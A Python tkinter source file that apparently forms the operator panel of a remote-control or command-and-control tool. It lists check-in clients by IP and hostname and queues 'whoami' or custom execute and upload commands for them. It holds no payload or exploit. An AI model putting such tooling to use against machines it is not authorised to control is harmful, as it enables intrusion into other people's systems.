import tkinter as tk
from tkinter import ttk, messagebox
import datetime
import json
from core.cmd import CommandExecutor

class ClientManager:
    def __init__(self):
        # key: client_id, value: dict with keys: last_seen, ip, hostname, pending_commands, history
        self.clients = {}

    def add_client(self, client_id, ip="Unknown", hostname="Unknown"):
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if client_id not in self.clients:
            self.clients[client_id] = {
                "last_seen": now,
                "ip": ip,
                "hostname": hostname,
                "pending_commands": [],
                "history": []
            }
        else:
            self.clients[client_id]["last_seen"] = now
            self.clients[client_id]["ip"] = ip
            self.clients[client_id]["hostname"] = hostname

    def add_command(self, client_id, command_type, args, ip="Unknown", hostname="Unknown"):
        self.add_client(client_id, ip, hostname)
        command = {
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": command_type,
            "args": args
        }
        self.clients[client_id]["pending_commands"].append(command)
        self.clients[client_id]["history"].append(command)

    def get_clients_info(self):
        return self.clients

    def get_client_history(self, client_id):
        return self.clients.get(client_id, {}).get("history", [])
    
    def get_pending_commands(self, client_id):
        return self.clients.get(client_id, {}).get("pending_commands", [])

    def clear_pending_commands(self, client_id):
        if client_id in self.clients:
            self.clients[client_id]["pending_commands"] = []

class ClientManagementTab:
    def __init__(self, parent, client_manager):
        self.frame = ttk.Frame(parent)
        self.client_manager = client_manager
        self.executor = CommandExecutor(self.client_manager)  # Start command executor
        self.create_widgets()
        self.refresh_client_list()

    def create_widgets(self):
        # Treeview for active clients with enhanced columns
        columns = ("Client ID", "IP", "Hostname", "Last Seen", "Pending Commands", "Command History")
        self.tree = ttk.Treeview(self.frame, columns=columns, show="headings")
        self.tree.heading("Client ID", text="Client ID")
        self.tree.heading("IP", text="IP Address")
        self.tree.heading("Hostname", text="Hostname")
        self.tree.heading("Last Seen", text="Last Seen")
        self.tree.heading("Pending Commands", text="Pending Commands")
        self.tree.heading("Command History", text="Command History")
        
        # Adjust column widths
        self.tree.column("Client ID", width=100)
        self.tree.column("IP", width=120)
        self.tree.column("Hostname", width=120)
        self.tree.column("Last Seen", width=150)
        self.tree.column("Pending Commands", width=100)
        self.tree.column("Command History", width=200)
        
        self.tree.pack(fill=tk.BOTH, padx=5, pady=5, expand=True)

        # Right-click context menu
        self.context_menu = tk.Menu(self.frame, tearoff=0)
        self.context_menu.add_command(label="Add Command: whoami", command=self.add_whoami_command)
        self.context_menu.add_command(label="Add Custom Command", command=self.add_custom_command)
        self.tree.bind("<Button-3>", self.show_context_menu)

        # Refresh button
        self.btn_refresh = ttk.Button(self.frame, text="Refresh", command=self.refresh_client_list)
        self.btn_refresh.pack(pady=5)

    def refresh_client_list(self):
        for item in self.tree.get_children():
            self.tree.delete(item)
        for client_id, info in self.client_manager.get_clients_info().items():
            pending_count = len(info.get("pending_commands", []))
            history_summary = "; ".join(
                [f"{cmd['command_type']}({cmd['args']})" + 
                 (f" -> {cmd.get('result', 'Pending')}" if 'result' in cmd else "") 
                 for cmd in info["history"][-3:]]
            )
            if len(info["history"]) > 3:
                history_summary += " ..."
            self.tree.insert("", tk.END, iid=client_id, values=(
                client_id,
                info["ip"],
                info["hostname"],
                info["last_seen"],
                pending_count,
                history_summary
            ))

    def show_context_menu(self, event):
        selected = self.tree.identify_row(event.y)
        if selected:
            self.tree.selection_set(selected)
            self.context_menu.post(event.x_root, event.y_root)

    def add_whoami_command(self):
        selected = self.tree.selection()
        if selected:
            client_id = selected[0]
            self.client_manager.add_command(client_id, "execute", "whoami")
            messagebox.showinfo("Success", f"Command 'whoami' queued for client {client_id}.")
            self.refresh_client_list()

    def add_custom_command(self):
        selected = self.tree.selection()
        if selected:
            client_id = selected[0]
            dialog = tk.Toplevel(self.frame)
            dialog.title("Add Custom Command")
            dialog.geometry("300x150")
            dialog.transient(self.frame)
            dialog.grab_set()

            ttk.Label(dialog, text="Command Type:").pack(pady=5)
            combo_command_type = ttk.Combobox(dialog, values=["execute", "upload"], state="readonly")
            combo_command_type.pack()
            combo_command_type.current(0)

            ttk.Label(dialog, text="Arguments:").pack(pady=5)
            entry_args = ttk.Entry(dialog)
            entry_args.pack()

            def submit_command():
                command_type = combo_command_type.get().strip()
                args = entry_args.get().strip()
                if not command_type or not args:
                    messagebox.showerror("Error", "Please fill in both fields.")
                    return
                self.client_manager.add_command(client_id, command_type, args)
                messagebox.showinfo("Success", f"Command queued for client {client_id}.")
                self.refresh_client_list()
                dialog.destroy()

            ttk.Button(dialog, text="Submit", command=submit_command).pack(pady=10)